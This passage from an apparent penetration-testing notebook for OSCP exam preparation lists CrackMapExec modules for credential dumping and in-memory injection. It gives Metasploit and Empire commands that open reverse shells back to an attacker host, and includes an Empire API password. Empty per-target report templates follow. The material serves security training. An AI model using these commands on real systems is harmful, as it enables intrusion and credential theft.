</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> met_inject                Downloads the Meterpreter stager and injects it into memory
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> mimikatz                  Dumps all logon credentials from memory
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> mimikittenz               Executes Mimikittenz
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> multirdp                  Patches terminal services in memory to allow multiple RDP users
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> netripper                 Capture</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">`</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#8045ff">\'</rich_text>
      <rich_text family="monospace" background="#000000000000">s credentials by using API hooking
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> pe_inject                 Downloads the specified DLL/EXE and injects it into memory
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> rdp                       Enables/Disables RDP
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> shellcode_inject          Downloads the specified raw shellcode and injects it into memory
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> test_connection           Pings a host
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> tokens                    Enumerates available tokens
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> uac                       Checks UAC status
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> wdigest                   Creates/Deletes the </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'UseLogonCredential'</rich_text>
      <rich_text family="monospace" background="#000000000000"> registry key enabling WDigest cred dumping on Windows &gt;</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">=</rich_text>
      <rich_text family="monospace" background="#000000000000"> </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">8</rich_text>
      <rich_text family="monospace" background="#000000000000">.1
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">[</rich_text>
      <rich_text family="monospace" background="#000000000000">*</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">]</rich_text>
      <rich_text family="monospace" background="#000000000000"> web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module</rich_text>
      <rich_text background="#000000000000">



</rich_text>
      <rich_text scale="h3" background="#000000000000">Getting shells </rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text scale="h4" background="#000000000000">Metasploit</rich_text>
      <rich_text background="#000000000000">:
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># First, set up a HTTP Reverse Handler</rich_text>
      <rich_text family="monospace" background="#000000000000">
msf &gt; use exploit/multi/handler 
msf exploit</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">handler</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000"> &gt; set payload windows/meterpreter/reverse_https
msf exploit</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">handler</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000"> &gt; set LHOST </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.10.3
msf exploit</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">handler</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000"> &gt; set exitonsession false
msf exploit</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">handler</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000"> &gt; exploit -j

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Met_Inject module</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'Administrator'</rich_text>
      <rich_text family="monospace" background="#000000000000"> -p </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#d88200">'PASS'</rich_text>
      <rich_text family="monospace" background="#000000000000"> --local-auth -M met_inject -o LHOST</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">=</rich_text>
      <rich_text family="monospace" background="#000000000000">YOURIP LPORT</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">=</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">4444</rich_text>
      <rich_text family="monospace" background="#000000000000"> </rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text scale="h4" background="#000000000000">Empire</rich_text>
      <rich_text background="#000000000000">:
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Start RESTful API</rich_text>
      <rich_text family="monospace" background="#000000000000">
empire --rest --user empireadmin --pass gH25Iv1K68@^

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># First setup an Empire HTTP listener</rich_text>
      <rich_text family="monospace" background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">Empire: listeners</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000"> &gt; set Name test
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">Empire: listeners</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000"> &gt; set Host </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.10.3
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">Empire: listeners</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000"> &gt; set Port </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">9090</rich_text>
      <rich_text family="monospace" background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">Empire: listeners</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000"> &gt; set CertPath data/empire.pem
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">Empire: listeners</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000"> &gt; run
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">(</rich_text>
      <rich_text family="monospace" background="#000000000000">Empire: listeners</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">)</rich_text>
      <rich_text family="monospace" background="#000000000000"> &gt; list

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Start RESTful API</rich_text>
      <rich_text family="monospace" background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># The username and password that CME uses to authenticate to Empire's RESTful API</rich_text>
      <rich_text family="monospace" background="#000000000000"> 
</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Are stored in the cme.conf file located at ~/.cme/cme.conf</rich_text>
      <rich_text family="monospace" background="#000000000000">
empire --rest --user empireadmin --pass gH25Iv1K68@^

</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#75715e"># Empire Module</rich_text>
      <rich_text family="monospace" background="#000000000000">
crackmapexec smb </rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#ae81ff">192</rich_text>
      <rich_text family="monospace" background="#000000000000">.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER</rich_text>
      <rich_text family="monospace" background="#000000000000" foreground="#f92672">=</rich_text>
      <rich_text family="monospace" background="#000000000000">CMETest</rich_text>
      <rich_text background="#000000000000">
</rich_text>
    </node>
  </node>
  <node unique_id="110" master_id="0" name="Targets" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="102" is_bold="1" foreground="#ed333b" ts_creation="1670981126" ts_lastsave="1724254755">
    <node unique_id="111" master_id="0" name="127.0.0.1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="103" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1670983937">
      <node unique_id="112" master_id="0" name="Enumeration" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="21" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949452">
        <node unique_id="113" master_id="0" name="TCP" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1492949819" ts_lastsave="1500473593"/>
        <node unique_id="114" master_id="0" name="UDP" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1492949826" ts_lastsave="1500473597"/>
        <node unique_id="115" master_id="0" name="Web Services" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="17" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949605">
          <node unique_id="116" master_id="0" name="Nikto" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1492949545" ts_lastsave="1492949578"/>
          <node unique_id="117" master_id="0" name="Dirb\DirBuster" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1492949554" ts_lastsave="1500473690"/>
          <node unique_id="118" master_id="0" name="WebDav" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1500473692" ts_lastsave="1500473698"/>
          <node unique_id="119" master_id="0" name="CMS" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1500473700" ts_lastsave="1500473703"/>
        </node>
        <node unique_id="120" master_id="0" name="Other Services" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="44" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500473607">
          <node unique_id="121" master_id="0" name="SMB" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1500473455" ts_lastsave="1500473619"/>
          <node unique_id="122" master_id="0" name="SNMP" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1500473619" ts_lastsave="1500473631"/>
          <node unique_id="123" master_id="0" name="DB" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1500473622" ts_lastsave="1500473677"/>
          <node unique_id="124" master_id="0" name="Other" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1500473623" ts_lastsave="1500473681"/>
        </node>
      </node>
      <node unique_id="125" master_id="0" name="Exploitation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
        <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Description</rich_text>
        <rich_text>: 



</rich_text>
        <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
        <rich_text>






</rich_text>
        <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
        <rich_text>







</rich_text>
        <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
        <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel






</rich_text>
      </node>
      <node unique_id="126" master_id="0" name="Post Exploitation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1495714301">
        <node unique_id="127" master_id="0" name="Script Results" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="44" is_bold="0" foreground="" ts_creation="1495714301" ts_lastsave="1495714310"/>
        <node unique_id="128" master_id="0" name="Host Information" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474204">
          <rich_text underline="single" weight="heavy">Operating System</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Architecture</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Domain</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Installed Updates</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node unique_id="129" master_id="0" name="File System" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474208">
          <rich_text underline="single" weight="heavy">Writeable Files\Directories</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Directory List</rich_text>
          <rich_text>




</rich_text>
        </node>
        <node unique_id="130" master_id="0" name="Running Processes" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1495714268">
          <rich_text underline="single" weight="heavy">Process List</rich_text>
        </node>
        <node unique_id="131" master_id="0" name="Installed Applications" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1495714509">
          <rich_text underline="single" weight="heavy">Installed Applications</rich_text>
        </node>
        <node unique_id="132" master_id="0" name="Users &amp; Groups" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474213">
          <rich_text underline="single" weight="heavy">Users</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">Groups</rich_text>
        </node>
        <node unique_id="133" master_id="0" name="Network" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474223">
          <rich_text underline="single" weight="heavy">IPConfig\IFConfig
</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Network Processes</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">ARP</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">DNS</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">Route</rich_text>
        </node>
        <node unique_id="134" master_id="0" name="Scheduled Jobs" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1496953428">
          <rich_text underline="single" weight="heavy">Scheduled Tasks</rich_text>
        </node>
      </node>
      <node unique_id="135" master_id="0" name="Priv Escalation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474606">
        <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Description</rich_text>
        <rich_text>: 

</rich_text>
        <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
        <rich_text>






</rich_text>
        <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
        <rich_text>







</rich_text>
        <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
        <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel

</rich_text>
      </node>
      <node unique_id="136" master_id="0" name="Findings" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1670983612">
        <node unique_id="137" master_id="0" name="Hashes" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949998"/>
        <node unique_id="138" master_id="0" name="Passwords" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492950150"/>
        <node unique_id="139" master_id="0" name="Proof\Flags\Other" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1496953479"/>
      </node>
      <node unique_id="140" master_id="0" name="Software Versions" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="12" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1496953122">
        <rich_text underline="single" weight="heavy">Software Versions
</rich_text>
        <rich_text>





</rich_text>
        <rich_text underline="single" weight="heavy">Potential Exploits</rich_text>
      </node>
      <node unique_id="142" master_id="0" name="Log Book" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1495714168"/>
    </node>
    <node unique_id="210" master_id="0" name="127.0.0.2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="103" is_bold="1" foreground="" ts_creation="1670983937" ts_lastsave="1670983955">
      <node unique_id="211" master_id="0" name="Enumeration" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
        <node unique_id="212" master_id="0" name="TCP" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
        <node unique_id="213" master_id="0" name="UDP" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
        <node unique_id="214" master_id="0" name="Web Services" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="17" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
          <node unique_id="215" master_id="0" name="Nikto" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
          <node unique_id="216" master_id="0" name="Dirb\DirBuster" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
          <node unique_id="217" master_id="0" name="WebDav" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
          <node unique_id="218" master_id="0" name="CMS" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
        </node>
        <node unique_id="219" master_id="0" name="Other Services" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="44" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
          <node unique_id="220" master_id="0" name="SMB" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
          <node unique_id="221" master_id="0" name="SNMP" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
          <node unique_id="222" master_id="0" name="DB" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
          <node unique_id="223" master_id="0" name="Other" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
        </node>
      </node>
      <node unique_id="224" master_id="0" name="Exploitation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
        <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Description</rich_text>
        <rich_text>: 



</rich_text>
        <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
        <rich_text>






</rich_text>
        <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
        <rich_text>







</rich_text>
        <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
        <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel






</rich_text>
      </node>
      <node unique_id="225" master_id="0" name="Post Exploitation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
        <node unique_id="226" master_id="0" name="Script Results" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="44" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
        <node unique_id="227" master_id="0" name="Host Information" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
          <rich_text underline="single" weight="heavy">Operating System</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Architecture</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Domain</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Installed Updates</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node unique_id="228" master_id="0" name="File System" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
          <rich_text underline="single" weight="heavy">Writeable Files\Directories</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Directory List</rich_text>
          <rich_text>




</rich_text>
        </node>
        <node unique_id="229" master_id="0" name="Running Processes" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
          <rich_text underline="single" weight="heavy">Process List</rich_text>
        </node>
        <node unique_id="230" master_id="0" name="Installed Applications" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
          <rich_text underline="single" weight="heavy">Installed Applications</rich_text>
        </node>
        <node unique_id="231" master_id="0" name="Users &amp; Groups" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
          <rich_text underline="single" weight="heavy">Users</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">Groups</rich_text>
        </node>
        <node unique_id="232" master_id="0" name="Network" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
          <rich_text underline="single" weight="heavy">IPConfig\IFConfig
</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Network Processes</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">ARP</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">DNS</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">Route</rich_text>
        </node>
        <node unique_id="233" master_id="0" name="Scheduled Jobs" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
          <rich_text underline="single" weight="heavy">Scheduled Tasks</rich_text>
        </node>
      </node>
      <node unique_id="234" master_id="0" name="Priv Escalation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
        <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
